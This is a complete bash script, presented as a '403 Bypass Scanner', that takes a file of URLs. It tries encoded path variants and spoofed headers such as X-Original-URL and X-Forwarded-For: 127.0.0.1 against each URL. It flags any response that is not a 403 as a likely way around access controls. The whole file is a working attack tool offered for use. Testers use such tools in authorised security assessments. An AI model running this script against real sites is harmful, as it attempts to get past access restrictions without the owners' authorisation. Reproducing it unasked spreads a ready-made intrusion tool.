#!/bin/bash

# 403 Bypass Scanner 
# Usage: ./403bypass.sh urls.txt

# Payloads for 403 bypass
payloads=(
    ""                 # normal
    "/"                # extra slash
    "//"               # double slash
    "/./"              # dot-slash
    "/%2e/"            # encoded dot
    "/%2e%2e/"         # double encoded
    "/?"               # add query
    "/*"               # wildcard
    "/%2f/"            # encoded slash
    "/%252e/"          # double encoded dot
    "/..;/"            # semicolon trick
    "/;/."             # semicolon dot
    "/%3f/"            # encoded ?
    "/%23/"            # encoded #
    "/%2e%2f"          # encoded ./ 
    "/%2e%2e%2f"       # encoded ../
)

# Headers for 403 bypass
declare -A headers
headers=(
    ["X-Original-URL"]="/"
    ["X-Rewrite-URL"]="/"
    ["X-Custom-IP-Authorization"]="127.0.0.1"
    ["X-Forwarded-For"]="127.0.0.1"
    ["X-Client-IP"]="127.0.0.1"
    ["X-Host"]="127.0.0.1"
    ["X-Forwarded-Host"]="127.0.0.1"
    ["Referer"]="https://google.com"
)

input=$1
if [[ -z "$input" ]]; then
    echo "Usage: $0 urls.txt"
    exit 1
fi

while read -r url; do
    [[ -z "$url" ]] && continue
    echo -e "\n\033[1;33m[Testing]\033[0m $url"

    for p in "${payloads[@]}"; do
        full="${url}${p}"
        code=$(curl -sk -o /dev/null -w "%{http_code}" "$full")
        if [[ "$code" != "403" ]]; then
            echo -e " [PATH] $full --> \033[1;32m$code\033[0m"
        else
            echo -e " [PATH] $full --> $code"
        fi
    done

    # Try header-based bypass
    for h in "${!headers[@]}"; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" -H "$h: ${headers[$h]}" "$url")
        if [[ "$code" != "403" ]]; then
            echo -e " [HEAD] $url with $h: ${headers[$h]} --> \033[1;32m$code\033[0m"
        fi
    done
done < "$input"

